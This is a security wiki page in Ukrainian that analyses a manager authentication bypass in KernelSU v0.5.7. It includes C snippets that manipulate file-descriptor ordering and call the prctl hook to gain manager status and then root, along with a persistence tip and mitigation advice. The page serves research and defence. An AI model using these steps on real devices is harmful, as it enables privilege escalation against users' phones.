# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks, такі як KernelSU, APatch і SKRoot, patch або hook Android/Linux kernel і відкривають privileged functionality для unprivileged userspace manager app. Magisk розглядається окремо нижче, оскільки CVE-2024-48336 стосувалася завантаження коду на стороні manager, а не цього KernelSU syscall path.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ця сторінка узагальнює techniques і pitfalls, виявлені під час public research (зокрема аналізу KernelSU v0.5.7 від Zimperium), щоб допомогти як red, так і blue teams зрозуміти attack surfaces, exploitation primitives і надійні mitigations.<sup>[[1]](#references)</sup>

---
## Архітектурний шаблон: syscall-hooked manager channel

- У KernelSU v0.5.7 kernel hook на `prctl` отримує magic value, command ID і command-specific arguments із userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Спочатку caller запитує статус manager за допомогою `CMD_BECOME_MANAGER`. Authorization залежить від command: `CMD_GRANT_ROOT` перевіряє стан manager/allowlist, `CMD_ALLOW_SU` доступний лише manager, а `CMD_SET_SEPOLICY` у цій версії доступний лише root.<sup>[[2]](#references)[[11]](#references)</sup>
- Інші commands отримують version/configuration або повідомляють про framework events.<sup>[[2]](#references)</sup>
- Оскільки будь-який app може викликати цей syscall interface, коректність manager authentication має критичне значення.<sup>[[1]](#references)[[2]](#references)</sup>

Приклад (KernelSU design):
- Hooked syscall: prctl
- Magic value для перенаправлення до KernelSU handler: 0xDEADBEEF
- Commands включають: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT тощо.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Authentication flow KernelSU v0.5.7 (як реалізовано)

Коли userspace викликає prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU перевіряє:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Перевірка prefix path
- Наданий path має починатися з очікуваного prefix для caller UID, наприклад /data/data/<pkg> або /data/user/<id>/<pkg>.
- Reference: логіка перевірки path prefix у core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Перевірка ownership
- Path має належати caller UID.
- Reference: логіка перевірки ownership у core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) APK signature check через FD table scan
- Перебрати open file descriptors процесу, що викликає, у порядку зростання descriptor order.
- Для кожного regular file, path якого починається з `/data/app/` і закінчується на `/base.apk`, вимагати, щоб path містив package substring, отриманий із наданого data-directory path.
- Перевірити signature першого candidate, який проходить ці path checks.
- Розібрати APK v2 signature і перевірити її щодо official manager certificate.
- References: manager.c (перебір FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Якщо всі checks пройдено, kernel тимчасово кешує UID manager; manager-only commands після цього приймають цей UID, тоді як інші commands зберігають власний UID або перевірки allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Клас vulnerability: довіра до APK selection, отриманого з path

KernelSU v0.5.7 не пов’язує результат signature check з ідентичністю встановленого package у PackageManager. У `manager.c` перевірка package є лише перевіркою path substring (`strstr(cwd, pkg)`); після цього signature перевіряється для першого candidate, який проходить цей test. Таким чином, attacker може розмістити genuine manager APK за `/data/app/` path, який також містить package name attacker, і забезпечити його вибір першим.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Ця trust-by-indirection дозволяє unprivileged app impersonate manager без володіння manager signing key.<sup>[[1]](#references)</sup>

Ключові властивості, які експлуатуються:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan упорядкований за descriptor index, а package check є path substring test, а не verified package-to-APK identity binding.
- open() повертає найменший доступний FD. Спочатку закривши FDs із меншими номерами, attacker може контролювати ordering.
- Bundled manager APK можна розмістити під `/data/app/` за path, який містить package string attacker, зберігаючи при цьому official manager signature.

---
## Передумови атаки

Конкретний випадок KernelSU v0.5.7 вимагає:<sup>[[1]](#references)[[3]](#references)</sup>

- Device уже rooted за допомогою vulnerable rooting framework (наприклад, KernelSU v0.5.7).
- Attacker може локально запускати довільний unprivileged code (Android app process).
- Для реалізації v0.5.7 `current->real_parent` має мати UID 0 (source comment описує це як zygote direct-child requirement); `manager.c` відхиляє інші parents.<sup>[[3]](#references)</sup>
- Справжній manager ще не пройшов authentication (наприклад, одразу після reboot). Деякі frameworks кешують manager UID після успіху; потрібно виграти race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (у demo video показано public proof of concept у роботі):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Створити valid path до data directory власного app, щоб пройти prefix і ownership checks.
2) Розмістити genuine KernelSU Manager base.apk під `/data/app/` за path, який містить package string, а потім відкрити його на FD з меншим номером, ніж FD власного base.apk.
3) Викликати prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), щоб пройти checks.
4) Використати `CMD_GRANT_ROOT`, потім `CMD_ALLOW_SU` для persistent su; викликати root-only `CMD_SET_SEPOLICY` лише після отримання root і лише там, де це supported.

Практичні нотатки щодо step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Визначити FD процесу для власного /data/app/*/base.apk, перебираючи symlinks у /proc/self/fd.
- Закрити low FD (наприклад, stdin, fd 0) і спочатку відкрити legitimate manager APK, щоб він зайняв fd 0 (або будь-який index, нижчий за FD власного base.apk).
- Додати legitimate manager APK до app так, щоб його path починався з `/data/app/`, закінчувався на `/base.apk` і містив package string. Наприклад, path у lib directory app може задовольнити ці checks.<sup>[[1]](#references)[[3]](#references)</sup>

Приклади code snippets (Android/Linux, лише для ілюстрації):

Перерахувати open FDs, щоб знайти записи base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Примусово спрямувати файловий дескриптор із меншим номером на легітимний APK менеджера:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Автентифікація Manager через hook `prctl` у KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Після успішного виконання привілейовані команди (приклади):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: підвищити привілеї поточного процесу до root
- CMD_ALLOW_SU: додати ваш package/UID до allowlist для постійного su
- CMD_SET_SEPOLICY: налаштувати політику SELinux після отримання root; KernelSU v0.5.7 перевіряє наявність UID 0 для цієї команди.<sup>[[2]](#references)</sup>

Порада щодо race/persistence:
- Зареєструйте receiver BOOT_COMPLETED в AndroidManifest (`RECEIVE_BOOT_COMPLETED`), щоб запускатися після перезавантаження та спробувати пройти authentication до справжнього manager; цей permission дозволяє отримувати `ACTION_BOOT_COMPLETED`, але сам по собі не гарантує пріоритет планування.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Рекомендації щодо виявлення та mitigation

Для розробників framework:
- Прив’язуйте authentication до package/UID caller, а не до довільних FD:
- Визначайте package caller за його UID і перевіряйте його відповідність signature встановленого package (через PackageManager), замість сканування FD.
- Якщо це kernel-only, використовуйте стабільну ідентичність caller (task creds) і перевіряйте її за стабільним джерелом істини, яким керує init/userspace helper, а не за FD процесу.
- Не використовуйте перевірки префікса шляху як ідентичність; caller може тривіально виконати таку умову.
- Використовуйте challenge–response на основі nonce через канал і очищайте будь-яку кешовану ідентичність manager під час boot або після ключових подій.
- За можливості розгляньте authenticated IPC на основі binder замість перевантаження generic syscall.

Для defenders/blue team:
- Виявляйте наявність rooting frameworks і процесів manager; відстежуйте виклики prctl із підозрілими magic constants (наприклад, 0xDEADBEEF), якщо у вас є kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- У керованих fleet блокуйте або створюйте alert щодо boot receiver від ненадійних package, які одразу після boot швидко виконують спроби привілейованих команд manager.
- Переконайтеся, що пристрої оновлено до patched версій framework; анулюйте кешовані ID manager після оновлення.

Обмеження attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Впливає лише на пристрої, які вже rooted за допомогою вразливого framework.
- Зазвичай потребує reboot/race window до authentication легітимного manager (деякі frameworks кешують UID manager до reset).

---
## Пов’язані нотатки щодо різних frameworks

- Аутентифікація на основі password (наприклад, історичні builds APatch/SKRoot) може бути слабкою, якщо password легко вгадати або bruteforce, чи якщо перевірки містять помилки.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Аутентифікація на основі package/signature (наприклад, KernelSU) у принципі є надійнішою, але має бути прив’язана до фактичного caller, а не до артефактів, отриманих із path і вибраних через сканування FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 впливала на builds до Canary 27007, які завантажували code із неперевіреного GMS package, дозволяючи локальному app виконувати code у Magisk app і підвищувати привілеї до root без взаємодії з користувачем.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting усього зла: вразливості безпеки, які могли скомпрометувати ваш мобільний пристрій](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – перевірки authentication у core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – ітерація FD, перевірка package і виклик signature у manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – перевірка APK v2 у apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Проєкт KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Проблема Magisk #8279 – перевірка, що GMS є системним app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Демонстраційне відео KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ідентифікатори команд у ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
